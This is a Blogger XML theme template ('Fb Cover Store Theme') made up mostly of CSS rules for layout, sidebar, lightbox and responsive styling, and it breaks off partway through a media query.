<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  
	<head>

<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.2.6/jquery.min.js' type='text/javascript'/>   
   
<b:include data='blog' name='all-head-content'/>
<meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
<b:if cond='data:blog.url == data:blog.homepageUrl'>

  <!-- Edit Description and Keywords Field -->

<meta content='DESCRIPTION HERE' name='description'/>
<meta content='KEYWORDS HERE' name='keywords'/>

  <!-- End of Edition-->

</b:if>

<b:if cond='data:blog.pageType == &quot;index&quot;'>
<title><data:blog.pageTitle/></title> 
<b:else/>
<title><data:blog.pageName/> | <data:blog.title/></title>
</b:if>

  <!-- Add Favicon URL in Below Field -->

<link href='YOUR-FAVICON-URL' rel='icon' type='image/jpeg'/>

  <!-- End of Edition-->

    <b:skin><![CDATA[/*
/**********************************************/
///////////////////////////////////////////////
//                                          //
//  Fb Cover Store Theme                   //
//  Theme Version: 1.0                    //
//  Date: Jan, 2014                      //
//  Designer: Harman Singh Hira         //
//  Site: www.Openw3.Blogspot.com      //
//  All rights are Strictly Reserved  //
//                                   //
//////////////////////////////////////
/************************************/

/* Variable definitions
   ====================
   <Variable name="bgcolor" description="Page Background Color"
             type="color" default="#fff" value="#ffffff">
   <Variable name="textcolor" description="Text Color"
             type="color" default="#fff" value="#ffffff">
   <Variable name="linkcolor" description="Link Color"
             type="color" default="#58a" value="#5588aa">
   <Variable name="pagetitlecolor" description="Blog Title Color"
             type="color" default="#666" value="#666666">
   <Variable name="descriptioncolor" description="Blog Description Color"
             type="color" default="#999" value="#999999">
   <Variable name="titlecolor" description="Post Title Color"
             type="color" default="#c60" value="#cc6600">
   <Variable name="bordercolor" description="Border Color"
             type="color" default="#ccc" value="#cccccc">
   <Variable name="sidebarcolor" description="Sidebar Title Color"
             type="color" default="#999" value="#999999">
   <Variable name="sidebartextcolor" description="Sidebar Text Color"
             type="color" default="#666" value="#666666">
   <Variable name="visitedlinkcolor" description="Visited Link Color"
             type="color" default="#999" value="#999999">
   <Variable name="bodyfont" description="Text Font"
             type="font" default="normal normal 100% Georgia, Serif" value="normal normal 100% Georgia, Serif">
   <Variable name="headerfont" description="Sidebar Title Font"
             type="font"
             default="normal normal 78% 'Trebuchet MS',Trebuchet,Arial,Verdana,Sans-serif" value="normal normal 78% 'Trebuchet MS',Trebuchet,Arial,Verdana,Sans-serif">
   <Variable name="pagetitlefont" description="Blog Title Font"
             type="font"
             default="normal normal 200% Georgia, Serif" value="normal normal 200% Georgia, Serif">
   <Variable name="descriptionfont" description="Blog Description Font"
             type="font"
             default="normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif" value="normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif">
   <Variable name="postfooterfont" description="Post Footer Font"
             type="font"
             default="normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif" value="normal normal 78% 'Trebuchet MS', Trebuchet, Arial, Verdana, Sans-serif">
   <Variable name="startSide" description="Side where text starts in blog language"
             type="automatic" default="left" value="left">
   <Variable name="endSide" description="Side where text ends in blog language"
             type="automatic" default="right" value="right">
*/

]]></b:skin>

<style type='text/css'>
*{margin:0;padding:0}
body{margin:0 auto;padding:0 0 0 0;background:#fff;color:#161514;font:13px Arial,Tahoma,Century gothic,sans-serif}
a{color:#fff;text-decoration:none;outline:none}
a:visited{color:#fff}
a:hover,a:active{color:#fff;text-decoration:none}
h1,h2,h3,h4,h5,h6{}
.clear{clear:both}
a img{border-width:0}
  .containerdiv {width:100%; position: relative;} 
.cornerimage {position: absolute; bottom: 6px; Left: 5px; width:23%; border:0px; filter:progid:DXImageTransform.Microsoft.Alpha(opacity=100); -moz-opacity: 1; opacity: 1;}
.cornerimage:hover {filter:progid:DXImageTransform.Microsoft.Alpha(opacity=3); -moz-opacity: 0.1; opacity: 0.1; }
#body-wrapper{margin:0px;padding:0px;}
  #img{width:100%;border:0px;float:center;}
img{width:100%;border:0px;}
img{width:100%;border;0;}
#header-wrapper{width:100%;background:#fff;height:10%;}
#header{width:100%;height:10%;}
#outer-wrapper{width:1000px;margin:10px auto;position:relative;box-shadow:0 0 10px #111;-moz-box-shadow:0 0 10px #111;-webkit-box-shadow:0 0 10px #111;padding:0 0;text-align:$startSide;font:$bodyfont}
#content-wrapper{width:1000px;margin:0 auto;background:#fff;}
#main-wrapper{float:left;width:640px;height:100%;padding:10px 0 0 0;margin:10px 0 0 20px;display:inline;overflow:hidden;word-wrap:break-word;overflow:hidden;}
#rsidebar-wrapper{width:310px;float:right;margin-top:20px;margin-right:20px;word-wrap:break-word;overflow:hidden;}
h2.date-header{margin:1.5em 0 .5em}
.wrapfullpost{margin:0px;padding:0px;}
.post{margin:0 0 20px 0;height:100%;color:#555;padding:5px 14px 5px 14px;border:1px solid #d5d5d5;color:#222;}
.post-body{margin:0 0 .75em;text-align:justify;padding-top:8px;color:#555;line-height:24px;text-shadow:1px 1px 0px #fff;}
.post-body blockquote{overflow:hidden;padding:10px 10px 10px 10px;color:#59666f;font-style:normal;}
.post-footer{margin:.75em 0;color:$sidebarcolor;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;line-height:1.4em}
.comment-link{margin-$startSide:.6em}
.post img{padding:0px;margin:0 4px 4px 0}
#comments{color:#666666;}
#comments h4{margin:em 0;font-weight:bold;line-height:1.4em;text-transform:uppercase;letter-spacing:.2em;color:$sidebarcolor}
#comments-block3{padding:0;margin:0;float:left;overflow:hidden;position:relative;}
#comment-name-url{width:465px;float:left}
#comment-date{width:465px;float:left;margin-top:5px;font-size:10px;}
#comment-header{float:left;border:1px solid #dddddd;padding:5px 0 40px 10px;margin:5px;background-color:#fff;position:relative;}
.avatar-image-container{background:url(http://1.bp.blogspot.com/_xpQK9GsnDPs/TOxSvUJSRpI/AAAAAAAAAmU/0he57Ik8S7c/s000/comment-avatar.jpg);width:32px;height:32px;float:right;margin:5px 10px 5px 5px;border:1px solid #ddd;}
.avatar-image-container img{width:32px;height:32px;}
a.comments-autor-name{color:#000;font:normal bold 12px Arial,Tahoma,Verdana}
a.says{color:#000;font:normal 11px Arial,Tahoma,Verdana}
.says a:hover{text-decoration:none}
.deleted-comment{font-style:italic;color:gray}
#blog-pager-newer-link{float:$startSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
#blog-pager-older-link{float:$endSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
.home-link{background:#3B5997;border:1px solid #D5D5D5;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;margin-top:6px;}
#blog-pager{text-align:center;position:relative;}
.feed-links{clear:both;line-height:2.5em}
.sidebar{margin:0 0 10px 0;color:#666666;}
.sidebar a{text-decoration:none;color:#6f6f6f}
.sidebar a:hover{text-decoration:none;color:#000}
.sidebar .widget{width:288px;padding:10px;background:#fff ;border:1px solid #d5d5d5;margin:0 0 10px 0}
.sidebar .widget h2{background:#F2F2F2;height:35px;padding-left:10px;color:#3D5A99;font:16px/35px Arial,Georgia,Tahoma,Century gothic,sans-serif;font-weight:bold;border: 1px solid #E9E9E9}
.sidebar ul{list-style-type:none;margin:0 0 10px 0;padding:0}
.sidebar ul li{padding: 6px 0px 6px 6px;margin: 0 0 2px 0;border-top: 1px solid #eeeeee;}
.sidebar .widget-content{}
.main .widget{border-bottom:0 dotted $bordercolor;margin:0 0 1.5em;padding:0 0 1.5em}
.main .Blog{border-bottom-width:0}
.profile-img{float:$startSide;margin-top:0;margin-$endSide:5px;margin-bottom:5px;margin-$startSide:0;padding:4px;border:1px solid $bordercolor}
.profile-data{margin:0;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;color:$sidebarcolor;font-weight:bold;line-height:1.6em}
.profile-datablock{margin:.5em 0 .5em}
.profile-textblock{margin:0.5em 0;line-height:1.6em}
.profile-link{font:$postfooterfont;text-transform:uppercase;letter-spacing:.1em}
#navbar-iframe{height:0;visibility:hidden;display:none;}
#footer{padding:5px 0 10px 0;color:#fff;font-size:12px;width:1000px;margin:0 auto;background:#3D5A99;border-top:1px solid #222}
#footer a:link,#footer a:visited{color:#fff}
#footer a:hover{color:#fff;text-decoration: underline}
.fleft{float:left;text-align:left;margin:10px 0 10px 20px;line-height:20px}
.fright{float:right;text-align:right;margin:10px 20px 10px 0;line-height:20px}
.frss{background:url(http://1.bp.blogspot.com/_xpQK9GsnDPs/TOxSwalBT0I/AAAAAAAAAmc/MbeHvqTVOyw/s000/rss.png) no-repeat;padding-left:20px}
.ftwit{background:url(http://4.bp.blogspot.com/_xpQK9GsnDPs/TOxSw3ze4HI/AAAAAAAAAmg/4LQBbU-hpUk/s000/twitter.png) no-repeat;padding-left:20px}
#bottom{margin:0 auto;border:1px solid #D5D5D5}
.bottomcover{background:#fff;margin:0 auto;width:1000px}
h3.bothead{height:20px;font-size:18px;padding:10px 0 10px 5px;color:#fff}
li.botwid{float:left;width:230px;padding-bottom:10px;font:12px Arial,Tahoma,Century gothic,sans-serif;margin:30px 0 0 15px;color:#ddd;list-style:none}
.botwid ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.botwid li{list-style-type:none;margin:0;padding:0}
.botwid ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.botwid ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul li{height:100%;line-height:18px;clear:left;width:230px;list-style-type:none}
.botwid ul li a:link,.botwid ul li a:visited{color:#555;text-decoration:none;padding:5px 0 5px 5px;display:block;border-bottom:1px solid #171717}
.botwid ul li a:hover{color:#999}
.botwid p{padding:7px 10px;margin:0}
.botwid table{width:100%;text-align:center;color:#787d7f}
#comment-form iframe{padding:5px;width:620px}
#search{background:url(images/search.png);width:273px;padding:5px 0;margin:10px 0 0 0;height:50px;display:inline}
#search form{margin:0 0 0 0;padding:0}
#search fieldset{margin:0;padding:0;border:none}
#search p{margin:0;font-size:85%}
#s{width:275px;margin:10px 0 0 0;padding:5px 5px;height:16px;border:none;font:normal 100% &quot;Tahoma&quot;,Arial,Helvetica,sans-serif;color:#333;border:1px solid #ddd;background:#F3F3F3;display:inline}
input#searchsubmit{padding:3px 5px;display:inline;margin:0 0 0 0;height:26px;background:#133E68;color:#fff;border:none}

.widleft{width:320px;float:left;margin-right:20px}
.widright{float:right!important;margin-right:0!important}
.widleft h2{color:#1a6014;font-size:18px;padding:5px 0}
.widleft p{color:#555;line-height:20px}
.widleft img{float:left;margin:5px 10px 5px 0}
.postmeta{border-top:1px dashed #ddd;border-bottom:1px dashed #ddd;padding:2px 0}
.author{color:#3B5998;padding:2px 5px 2px 5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.clock{color:#3B5998;padding:2px 5px 2px 0;text-transform:uppercase;font-size:10px}
.comm{color:#3B5998;padding:2px 5px 2px 0;margin-left:5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.comm a:link,.comm a:visited{color:#3B5998}
.comm a:hover{color:#000;text-shadow:1px 1px 1px #ccc}
.singleinfo{text-transform:uppercase;padding:5px 5px}
.rmore{padding:5px 0 5px 5px;color:#3B5997;font-weight:bold}
.rmore a:link,.rmore a:visited{color:#ff6c14}
.categ{padding:5px 0 5px 5px;color:#000;font-size:10px}
.categ a:link,.categ a:visited{color:#3B5997}
.categ a:hover{color:#000}
.sidebox{width:288px;padding:10px;border:1px solid #d5d5d5;margin:0 0 10px 0}
.sidebox ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.sidebox li{list-style-type:none;margin:0;padding:0}
.sidebox ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.sidebox ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul li{height:100%;line-height:18px;clear:left;width:295px;margin:0 0;list-style-type:none}
.sidebox ul li a:link,.sidebox ul li a:visited{color:#6f6f6f;border-bottom:1px dotted #ddd;text-decoration:none;padding:5px 0 5px 10px;display:block}
.sidebox ul li a:hover{color:#000}
.sidebox p{padding:7px 10px;margin:0}
.sidebox table{width:100%;text-align:center;color:#787d7f}
h3.sidetitl{background:#F2F2F2;border:1px solid #D5D5D5;color:#3D5A99;height:35px;padding-left:10px;font:16px/35px Arial,Georgia,Tahoma,Century gothic,sans-serif;font-weight:bold;}
#blog-pager{font-size:normal}.showpageArea{font-family:verdana,arial,helvetica;color:#fff;font-size:11px;margin:10px;padding:8px 20px;background:#333}.showpageArea a{color:#fff}.showpageNum a{padding:3px 8px;margin:0 4px;text-decoration:none;background:#666}.showpageNum a:hover{background:#aeb404}.showpagePoint{color:#fff;padding:3px 8px;margin:2px;font-weight:700;background:#3B5998;text-decoration:none}.showpageOf{margin:0 5px 0 0}
#colorbox, #cboxOverlay, #cboxWrapper{position:absolute; top:0; left:0; z-index:9999; overflow:hidden;}
#cboxWrapper {max-width:none;}
#cboxOverlay{position:fixed; width:100%; height:100%;}
#cboxMiddleLeft, #cboxBottomLeft{clear:left;}
#cboxContent{position:relative;}
#cboxLoadedContent{overflow:auto; -webkit-overflow-scrolling: touch;}
#cboxTitle{margin:0;}
#cboxLoadingOverlay, #cboxLoadingGraphic{position:absolute; top:0; left:0; width:100%; height:100%;}
#cboxPrevious, #cboxNext, #cboxClose, #cboxSlideshow{cursor:pointer;}
.cboxPhoto{float:left; margin:auto; border:0; display:block; max-width:none; -ms-interpolation-mode:bicubic;}
.cboxIframe{width:100%; height:100%; display:block; border:0;}
#colorbox, #cboxContent, #cboxLoadedContent{box-sizing:content-box; -moz-box-sizing:content-box; -webkit-box-sizing:content-box;}
#cboxOverlay{background:url(http://2.bp.blogspot.com/-Xmfn7n2Hngw/UsjyqS2jhyI/AAAAAAAABNI/4qhCBrkmTI4/s1600/overlay.png) repeat 0 0;}
#colorbox{outline:0;}
#cboxTopLeft{width:21px; height:21px; background:url(http://4.bp.blogspot.com/-zk8HLVIhb5Y/Usjx71XLeiI/AAAAAAAABM4/agcD5H-Pyc4/s1600/controls.png) no-repeat -101px 0;}
#cboxTopRight{width:21px; height:21px; background:url(http://4.bp.blogspot.com/-zk8HLVIhb5Y/Usjx71XLeiI/AAAAAAAABM4/agcD5H-Pyc4/s1600/controls.png) no-repeat -130px 0;}
#cboxBottomLeft{width:21px; height:21px; background:url(http://4.bp.blogspot.com/-zk8HLVIhb5Y/Usjx71XLeiI/AAAAAAAABM4/agcD5H-Pyc4/s1600/controls.png) no-repeat -101px -29px;}
#cboxBottomRight{width:21px; height:21px; background:url(http://4.bp.blogspot.com/-zk8HLVIhb5Y/Usjx71XLeiI/AAAAAAAABM4/agcD5H-Pyc4/s1600/controls.png) no-repeat -130px -29px;}
#cboxMiddleLeft{width:21px; background:url(http://4.bp.blogspot.com/-zk8HLVIhb5Y/Usjx71XLeiI/AAAAAAAABM4/agcD5H-Pyc4/s1600/controls.png) left top repeat-y;}
#cboxMiddleRight{width:21px; background:url(http://4.bp.blogspot.com/-zk8HLVIhb5Y/Usjx71XLeiI/AAAAAAAABM4/agcD5H-Pyc4/s1600/controls.png) right top repeat-y;}
#cboxTopCenter{height:21px; background:url(http://1.bp.blogspot.com/-FRO_wR-7-rs/UsjyMsTjwUI/AAAAAAAABNA/St_lSiZ2zXg/s1600/border.png) 0 0 repeat-x;}
#cboxBottomCenter{height:21px; background:url(http://1.bp.blogspot.com/-FRO_wR-7-rs/UsjyMsTjwUI/AAAAAAAABNA/St_lSiZ2zXg/s1600/border.png) 0 -29px repeat-x;}
#cboxContent{background:#fff; overflow:hidden;}
.cboxIframe{background:#fff;}
#cboxError{padding:50px; border:1px solid #ccc;}
#cboxLoadedContent{margin-bottom:28px;}
#cboxTitle{position:absolute; bottom:4px; left:0; text-align:center; width:100%; color:#949494;}
#cboxLoadingOverlay{background:url(http://2.bp.blogspot.com/-IgBJF2sIWaU/UsjyqTd1JcI/AAAAAAAABNM/BVRFb25oG1c/s1600/loading_background.png) no-repeat center center;}
#cboxLoadingGraphic{background:url(http://4.bp.blogspot.com/-vyOSg4TIJAE/UsjyqQpAWyI/AAAAAAAABNQ/G9S6TCSw_tU/s1600/loading.gif) no-repeat center center;}
#cboxPrevious, #cboxNext, #cboxSlideshow, #cboxClose {border:0; padding:0; margin:0; overflow:visible; width:auto; background:none; }
#cboxPrevious:active, #cboxNext:active, #cboxSlideshow:active, #cboxClose:active {outline:0;}
#cboxSlideshow{position:absolute; bottom:4px; right:30px; color:#0092ef;}
#cboxClose{position:absolute; bottom:0; right:0; background:url(http://4.bp.blogspot.com/-zk8HLVIhb5Y/Usjx71XLeiI/AAAAAAAABM4/agcD5H-Pyc4/s1600/controls.png) no-repeat -25px 0; width:25px; height:25px; text-indent:-9999px;}
#cboxClose:hover{background-position:-25px -25px;}
.cboxIE #cboxTopLeft, .cboxIE #cboxTopCenter, .cboxIE #cboxTopRight, .cboxIE #cboxBottomLeft, .cboxIE #cboxBottomCenter, .cboxIE #cboxBottomRight, .cboxIE #cboxMiddleLeft, .cboxIE #cboxMiddleRight {filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#00FFFFFF,endColorstr=#00FFFFFF);}
#md-loading{position:fixed;z-index:50;top:0;left:0;width:100%;height:100%;background: #FDFEF8 url(http://tygr.in/shop/catalog/view/theme/default/image/fb_loader.gif) no-repeat center;line-height: 350px;text-align: center;font-size: 36px;color: #353231;text-indent: -9999px;}
.MD #md-loading {display: none;}
@media only screen and (device-width: 768px) {
#loading {position:absolute;width:1040px;min-height:768px;}
#md-loader {height: 100%;display: none;}}
.clearfix:before,
.clearfix:after {content: &quot; &quot;; display: table;}
.clearfix:after {clear: both;}
.clearfix {*zoom: 1;}
nav {height: 40px;width: 100%;background: #3B5998;font-size: 11pt;font-family: &#39;PT Sans&#39;, Arial, sans-serif;font-weight: bold;position: relative;border-bottom: 2px solid #283744;}
nav ul {padding: 0;margin: 0 auto;width: 600px;height: 40px;}
nav li {display: inline;float: left;}
nav a {color: #fff;display: inline-block;width: 100px;text-align: center;text-decoration: none;line-height: 40px;text-shadow: 1px 1px 0px #283744;}
nav li a {border-right: 1px solid #fff;box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;}
nav li:last-child a {border-right: 0;}
nav a:hover, nav a:active {color:#fff;background-color: #8c99a4;}
nav a#pull {display: none;}
nav a:visited  {color:#fff;}
@media screen and (max-width: 600px) {
nav { height: auto;	}
nav ul {width: 100%;display: block;height: auto;}
nav li {width: 50%;	float: left;position: relative;}
nav li a {border-bottom: 1px solid #fff;border-right: 1px solid #fff;}
nav a {text-align: left;width: 100%;text-indent: 25px;}}
@media only screen and (max-width : 480px) {
nav {border-bottom: 0;}
nav ul {display: none;height: auto;}
nav a#pull {display: block;background-color: #3B5998;width: 100%;position: relative;}
nav a#pull:after {content:&quot;&quot;;background: url(&#39;http://3.bp.blogspot.com/-pMzzBcOzfPQ/UsVDM1FOe9I/AAAAAAAABMU/n_Msqiy-DEg/s1600/nav-icon.png&#39;) no-repeat;width: 30px;height: 30px;display: inline-block;position: absolute;right: 15px;top: 10px;}}
@media only screen and (max-width : 320px) {
nav li {display: block;float: none;width: 100%;}
nav li a {border-bottom: 1px solid #fff;}}

@media screen and (max-width : 1440px) {
#header-wrapper{width:100%;background:#fff;height:10%;}
#header{width:100%;height:10%;}
#outer-wrapper{width:1000px;margin:10px auto;position:relative;box-shadow:0 0 10px #111;-moz-box-shadow:0 0 10px #111;-webkit-box-shadow:0 0 10px #111;padding:0 0;text-align:$startSide;font:$bodyfont}
#content-wrapper{width:1000px;margin:0 auto;background:#fff;}
#main-wrapper{float:left;width:640px;height:100%;padding:10px 0 0 0;margin:10px 0 0 20px;display:inline;overflow:hidden;word-wrap:break-word;overflow:hidden;}
#rsidebar-wrapper{width:310px;float:right;margin-top:20px;margin-right:20px;word-wrap:break-word;overflow:hidden;}
h2.date-header{margin:1.5em 0 .5em}
.wrapfullpost{margin:0px;padding:0px;}
.post{margin:0 0 20px 0;height:100%;color:#555;padding:5px 14px 5px 14px;border:1px solid #d5d5d5;color:#222;}
.post-body{margin:0 0 .75em;text-align:justify;padding-top:8px;color:#555;line-height:24px;text-shadow:1px 1px 0px #fff;}
.post-body blockquote{overflow:hidden;padding:10px 10px 10px 10px;color:#59666f;font-style:normal;}
.post-footer{margin:.75em 0;color:$sidebarcolor;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;line-height:1.4em}
.comment-link{margin-$startSide:.6em}
.post img{padding:0px;margin:0 4px 4px 0}
#comments{color:#666666;}
#comments h4{margin:em 0;font-weight:bold;line-height:1.4em;text-transform:uppercase;letter-spacing:.2em;color:$sidebarcolor}
#comments-block3{padding:0;margin:0;float:left;overflow:hidden;position:relative;}
#comment-name-url{width:465px;float:left}
#comment-date{width:465px;float:left;margin-top:5px;font-size:10px;}
#comment-header{float:left;border:1px solid #dddddd;padding:5px 0 40px 10px;margin:5px;background-color:#fff;position:relative;}
.avatar-image-container{background:url(http://1.bp.blogspot.com/_xpQK9GsnDPs/TOxSvUJSRpI/AAAAAAAAAmU/0he57Ik8S7c/s000/comment-avatar.jpg);width:32px;height:32px;float:right;margin:5px 10px 5px 5px;border:1px solid #ddd;}
.avatar-image-container img{width:32px;height:32px;}
a.comments-autor-name{color:#000;font:normal bold 12px Arial,Tahoma,Verdana}
a.says{color:#000;font:normal 11px Arial,Tahoma,Verdana}
.says a:hover{text-decoration:none}
.deleted-comment{font-style:italic;color:gray}
#blog-pager-newer-link{float:$startSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
#blog-pager-older-link{float:$endSide;background:#3B5997;border:1px solid #E9E9E9;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;}
.home-link{background:#3B5997;border:1px solid #D5D5D5;color:#3D5A99;text-decoration:none;border-radius:5px;-moz-border-radius:5px;-webkit-border-radius:5px;padding:5px 10px;margin-top:6px;}
#blog-pager{text-align:center;position:relative;}
.feed-links{clear:both;line-height:2.5em}
.sidebar{margin:0 0 10px 0;color:#666666;}
.sidebar a{text-decoration:none;color:#6f6f6f}
.sidebar a:hover{text-decoration:none;color:#000}
.sidebar .widget{width:288px;padding:10px;background:#fff ;border:1px solid #d5d5d5;margin:0 0 10px 0}
.sidebar .widget h2{background:#F2F2F2;height:35px;padding-left:10px;color:#3D5A99;font:16px/35px Arial,Georgia,Tahoma,Century gothic,sans-serif;font-weight:bold;border: 1px solid #E9E9E9}
.sidebar ul{list-style-type:none;margin:0 0 10px 0;padding:0}
.sidebar ul li{padding: 6px 0px 6px 6px;margin: 0 0 2px 0;border-top: 1px solid #eeeeee;}
.sidebar .widget-content{}
.main .widget{border-bottom:0 dotted $bordercolor;margin:0 0 1.5em;padding:0 0 1.5em}
.main .Blog{border-bottom-width:0}
.profile-img{float:$startSide;margin-top:0;margin-$endSide:5px;margin-bottom:5px;margin-$startSide:0;padding:4px;border:1px solid $bordercolor}
.profile-data{margin:0;text-transform:uppercase;letter-spacing:.1em;font:$postfooterfont;color:$sidebarcolor;font-weight:bold;line-height:1.6em}
.profile-datablock{margin:.5em 0 .5em}
.profile-textblock{margin:0.5em 0;line-height:1.6em}
.profile-link{font:$postfooterfont;text-transform:uppercase;letter-spacing:.1em}
#navbar-iframe{height:0;visibility:hidden;display:none;}
#footer{padding:5px 0 10px 0;color:#fff;font-size:12px;width:1000px;margin:0 auto;background:#3D5A99;border-top:1px solid #222}
#footer a:link,#footer a:visited{color:#fff}
#footer a:hover{color:#fff;text-decoration: underline}
.fleft{float:left;text-align:left;margin:10px 0 10px 20px;line-height:20px}
.fright{float:right;text-align:right;margin:10px 20px 10px 0;line-height:20px}
.frss{background:url(http://1.bp.blogspot.com/_xpQK9GsnDPs/TOxSwalBT0I/AAAAAAAAAmc/MbeHvqTVOyw/s000/rss.png) no-repeat;padding-left:20px}
.ftwit{background:url(http://4.bp.blogspot.com/_xpQK9GsnDPs/TOxSw3ze4HI/AAAAAAAAAmg/4LQBbU-hpUk/s000/twitter.png) no-repeat;padding-left:20px}
#bottom{margin:0 auto;border:1px solid #D5D5D5}
.bottomcover{background:#fff;margin:0 auto;width:1000px}
h3.bothead{height:20px;font-size:18px;padding:10px 0 10px 5px;color:#fff}
li.botwid{float:left;width:230px;padding-bottom:10px;font:12px Arial,Tahoma,Century gothic,sans-serif;margin:30px 0 0 15px;color:#ddd;list-style:none}
.botwid ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.botwid li{list-style-type:none;margin:0;padding:0}
.botwid ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.botwid ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.botwid ul li{height:100%;line-height:18px;clear:left;width:230px;list-style-type:none}
.botwid ul li a:link,.botwid ul li a:visited{color:#555;text-decoration:none;padding:5px 0 5px 5px;display:block;border-bottom:1px solid #171717}
.botwid ul li a:hover{color:#999}
.botwid p{padding:7px 10px;margin:0}
.botwid table{width:100%;text-align:center;color:#787d7f}
#comment-form iframe{padding:5px;width:620px}
#search{background:url(images/search.png);width:273px;padding:5px 0;margin:10px 0 0 0;height:50px;display:inline}
#search form{margin:0 0 0 0;padding:0}
#search fieldset{margin:0;padding:0;border:none}
#search p{margin:0;font-size:85%}
#s{width:275px;margin:10px 0 0 0;padding:5px 5px;height:16px;border:none;font:normal 100% &quot;Tahoma&quot;,Arial,Helvetica,sans-serif;color:#333;border:1px solid #ddd;background:#F3F3F3;display:inline}
input#searchsubmit{padding:3px 5px;display:inline;margin:0 0 0 0;height:26px;background:#133E68;color:#fff;border:none}

#topbox{display:inline-block;width:1000px;padding:10px 0 50px 0;margin:0px auto;}
.widleft{width:320px;float:left;margin-right:20px}
.widright{float:right!important;margin-right:0!important}
.widleft h2{color:#1a6014;font-size:18px;padding:5px 0}
.widleft p{color:#555;line-height:20px}
.widleft img{float:left;margin:5px 10px 5px 0}
.postmeta{border-top:1px dashed #ddd;border-bottom:1px dashed #ddd;padding:2px 0}
.author{color:#3B5998;padding:2px 5px 2px 5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.clock{color:#3B5998;padding:2px 5px 2px 0;text-transform:uppercase;font-size:10px}
.comm{color:#3B5998;padding:2px 5px 2px 0;margin-left:5px;text-shadow:1px 1px 0 #fff;text-transform:uppercase;font-size:10px}
.comm a:link,.comm a:visited{color:#3B5998}
.comm a:hover{color:#000;text-shadow:1px 1px 1px #ccc}
.singleinfo{text-transform:uppercase;padding:5px 5px}
.rmore{padding:5px 0 5px 5px;color:#3B5997;font-weight:bold}
.rmore a:link,.rmore a:visited{color:#ff6c14}
.categ{padding:5px 0 5px 5px;color:#000;font-size:10px}
.categ a:link,.categ a:visited{color:#3B5997}
.categ a:hover{color:#000}
.sidebox{width:288px;padding:10px;border:1px solid #d5d5d5;margin:0 0 10px 0}
.sidebox ul{list-style-type:none;margin:0;padding:0 0 5px 0}
.sidebox li{list-style-type:none;margin:0;padding:0}
.sidebox ul ul{list-style-type:none;margin:0;padding:0 0 0 0;background-repeat:no-repeat}
.sidebox ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul ul ul ul{list-style-type:none;margin:0;padding:0;border:0}
.sidebox ul li{height:100%;line-height:18px;clear:left;width:295px;margin:0 0;list-style-type:none}
.sidebox ul li a:link,.sidebox ul li a:visited{color:#6f6f6f;border-bottom:1px dotted #ddd;text-decoration:none;padding:5px 0 5px 10px;display:block}
.sidebox ul li a:hover{color:#000}
.sidebox p{padding:7px 10px;margin:0}
.sidebox table{width:100%;text-align:center;color:#787d7f}
h3.sidetitl{background:#F2F2F2;border:1px solid #D5D5D5;color:#3D5A99;height:35px;padding-left:10px;font:16px/35px Arial,Georgia,Tahoma,Century gothic,sans-serif;font-weight:bold;}
}

@media screen and (max-width : 960px) {
#header-wrapper{width:100%;background:#fff;height:10%;}
#header{width:100%;height:10%;}
#outer-wrapper{width:100%;margin:10px auto;position:relative;box-shadow:0 0 10px #111;-moz-box-shadow:0 0 10px #111;-webkit-box-shadow:0 0 10px #111;padding:0 0;text-align:$startSide;font:$bodyfont}
#content-wrapper{width:100%;margin:0 auto;background:#fff;}
#main-wrapper{float:center;width:100%;height:100%;padding:10px 0 0 0;margin:10px 0 0 20px;display:inline;overflow:hidden;word-wrap:break-word;overflow:hidden;}
#rsidebar-wrapper{width:100%;display:none;margin-top:20px;margin-right:20px;word-wrap:break-word;overflow:hidden;}
h2.date-header{margin:1.5em 0 .5em}
.wrapfullpost{margin:0px;padding:0px;}
.post{margin:0 0 20px 0;height:100%;color:#555;padding:5px 14px 5px 14px;border:1px solid #d5d5d5;color:#222;}
